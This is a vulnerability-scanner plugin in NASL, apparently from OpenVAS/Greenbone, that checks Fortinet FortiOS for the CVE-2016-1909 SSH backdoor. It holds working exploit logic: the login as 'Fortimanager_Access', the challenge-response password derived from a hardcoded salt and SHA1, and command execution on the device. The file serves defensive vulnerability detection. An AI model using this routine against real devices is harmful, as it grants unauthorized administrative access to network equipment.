# Copyright (C) 2017 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140239");
  script_version("2021-07-12T08:06:48+0000");
  script_tag(name:"last_modification", value:"2021-07-12 08:06:48 +0000 (Mon, 12 Jul 2021)");
  script_tag(name:"creation_date", value:"2017-04-07 16:08:03 +0200 (Fri, 07 Apr 2017)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2016-1909");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"exploit");

  script_name("Fortinet FortiOS SSH Undocumented Interactive Login Vulnerability (FG-IR-16-001) - Active Check");

  script_category(ACT_ATTACK);
  script_family("Default Accounts");
  script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
  script_dependencies("ssh_detect.nasl", "gb_default_credentials_options.nasl");
  script_require_ports("Services/ssh", 22);
  script_mandatory_keys("ssh/server_banner/available");
  script_exclude_keys("default_credentials/disable_default_account_checks");

  script_tag(name:"summary", value:"An undocumented account used for communication with authorized
  FortiManager devices exists on some versions of FortiOS.");

  script_tag(name:"insight", value:"On vulnerable versions, and provided 'Administrative Access' is
  enabled for SSH, this account can be used to log in via SSH in Interactive-Keyboard mode, using
  a password shared across all devices. It gives access to a CLI console with administrative rights.");

  script_tag(name:"impact", value:"Successful exploitation would allow remote console access to
  vulnerable devices with 'Administrative Access' enabled for SSH.");

  script_tag(name:"vuldetect", value:"Try to login via SSH as user 'Fortimanager_Access'.");

  script_tag(name:"affected", value:"FortiOS 4.1.0 through 4.1.10, 4.2.0 through 4.2.15, 4.3.0
  through 4.3.16 and 5.0.0 through 5.0.7.");

  script_tag(name:"solution", value:"Update FortiOS to version 4.1.11, 4.2.16, 4.3.17, 5.0.8, 5.2.0,
  5.4.0 or later.");

  script_xref(name:"URL", value:"https://www.fortiguard.com/psirt/FG-IR-16-001");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/80581");

  exit(0);
}

if( get_kb_item( "default_credentials/disable_default_account_checks" ) )
  exit( 0 );

include("ssh_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

if( defined_func( "ssh_login_interactive" ) &&
    defined_func( "ssh_login_interactive_pass" )
  ) {
  port = ssh_get_port( default:22 );
  if( ! soc = open_sock_tcp( port ) )
    exit( 0 );

  user = "Fortimanager_Access";

  auth = get_kb_item( "SSH/supportedauth/" + port );
  if( auth =~ "^publickey$" )
    exit( 0 );

  if( ! sess = ssh_connect( socket:soc ) )
    exit ( 0 );

  prompt = ssh_login_interactive( sess, login:user );

  if( ! prompt || prompt !~ "^(-)?[0-9]+" ) {
    ssh_disconnect( soc );
    close( soc );
    exit( 0 );
  }

  m = crap( data:raw_string( 0 ), length:12 ) +
      prompt +
      "FGTAbc11*xy+Qqz27" +
      raw_string( 0xA3, 0x88, 0xBA, 0x2E, 0x42, 0x4C, 0xB0, 0x4A,
                  0x53, 0x79, 0x30, 0xC1, 0x31, 0x07, 0xCC, 0x3F,
                  0xA1, 0x32, 0x90, 0x29, 0xA9, 0x81, 0x5B, 0x70 );

  x = SHA1( m );
  y = crap( data:raw_string( 0 ), length:12 ) + x;

  pass1 = "AK1" + base64( str:y );

  login = ssh_login_interactive_pass( sess, password:pass1 );

  if( login == 0 ) {
    buf = ssh_request_exec( sess, cmd:"get system status" );

    if( "Version:" >< buf && "Forti" >< buf ) {
      report = 'It was possible to login into the remote Forti Device as user "' + user + '" and to execute "get system status".\n\nResult:\n\n' + buf;
      security_message( port:port, data:report );
      ssh_disconnect( soc );
      close( soc );
      exit( 0 );
    }
  }

  ssh_disconnect( soc );
  if( soc )
    close( soc );
}

exit( 0 );